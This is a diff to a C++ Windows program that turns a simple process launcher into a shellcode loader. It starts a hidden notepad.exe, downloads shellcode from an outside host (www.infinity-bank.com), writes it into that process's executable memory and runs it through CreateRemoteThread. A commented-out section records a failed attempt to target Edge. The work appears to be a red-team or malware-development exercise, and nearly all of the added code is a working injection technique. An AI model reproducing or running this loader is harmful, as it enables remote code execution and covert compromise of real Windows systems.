@@ -1,5 +1,7 @@
-#include <iostream>
 #include <Windows.h>
+#include <winhttp.h>
+#include <iostream>
+#include <vector>
 
 #pragma comment(lib, "winhttp.lib")
 
@@ -15,30 +17,73 @@ int main()
     // create process info struct
     PPROCESS_INFORMATION process_info = new PROCESS_INFORMATION();
 
-    // null terminated command line
-    wchar_t cmd[] = L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\0";
+    // null terminated command line/
+    /* these dont work  - proection on edge?     wchar_t cmd[] = L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\0";
 
     wchar_t current_dir[] = L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\\0";
 
-    // create process 
-    // This is cheating, create a branch which finds a target.
-    BOOL success = CreateProcess(
+    // create process
+    CreateProcess(
         NULL,
         cmd,
         NULL,
         NULL,
         FALSE,
-        0,
+        CREATE_NO_WINDOW,
         NULL,
         current_dir,
         startup_info,
         process_info);
+    */
 
-    // bail if call failed
-    if (!success) {
-        printf("[x] CreateProcess failed: %d\n", GetLastError());
-        return 1;
-    }
+   // null terminated command line
+    wchar_t cmd[] = L"notepad.exe\0";
+
+    // create process
+    CreateProcess(
+        NULL,
+        cmd,
+        NULL,
+        NULL,
+        FALSE,
+        CREATE_NO_WINDOW,
+        NULL,
+        NULL,
+        startup_info,
+        process_info);
+
+
+    //Download shellcode
+    std::vector<BYTE> shellcode = Download(L"www.infinity-bank.com\0", L"/shellcode/p/bhttp\0");
+
+    // allocate memory
+    LPVOID ptr = VirtualAllocEx(
+        process_info->hProcess,
+        NULL,
+        shellcode.size(),
+        MEM_COMMIT,
+        PAGE_EXECUTE_READWRITE);
+
+    // copy shellcode
+    SIZE_T bytesWritten = 0;
+    WriteProcessMemory(
+        process_info->hProcess,
+        ptr,
+        &shellcode[0],
+        shellcode.size(),
+        &bytesWritten);
+
+    // create remote thread
+    DWORD threadId = 0;
+    HANDLE hThread = CreateRemoteThread(
+        process_info->hProcess,
+        NULL,
+        0,
+        (LPTHREAD_START_ROUTINE)ptr,
+        NULL,
+        0,
+        &threadId);
+
 
     // print process information
     printf("dwProcessId : %d\n", process_info->dwProcessId);
@@ -47,6 +92,7 @@ int main()
     printf("hThread     : %p\n", process_info->hThread);
 
     // close the handles
+    CloseHandle(hThread);
     CloseHandle(process_info->hThread);
     CloseHandle(process_info->hProcess);
 }
